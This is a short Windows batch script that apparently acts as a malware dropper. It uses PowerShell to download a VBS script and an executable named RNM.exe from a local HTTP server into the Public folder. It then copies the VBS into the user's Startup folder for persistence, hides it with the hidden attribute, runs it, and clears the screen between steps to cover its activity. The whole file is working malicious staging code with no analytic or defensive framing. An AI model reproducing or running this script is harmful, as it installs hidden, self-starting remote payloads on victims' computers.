powershell -c Invoke-WebRequest -Uri http://192.168.1.3:8000/file.vbs -Outfile "C:\Users\Public\file.vbs"
cls
powershell -c Invoke-WebRequest -Uri http://192.168.1.3:8000/RNM.exe -Outfile "C:\Users\Public\RNM.exe"
cls
copy c:\Users\Public\file.vbs "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\file.vbs"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\file.vbs"
cls
C:\Users\Public\file.vbs
cls
shutdown -r -t 1
shutdown -a
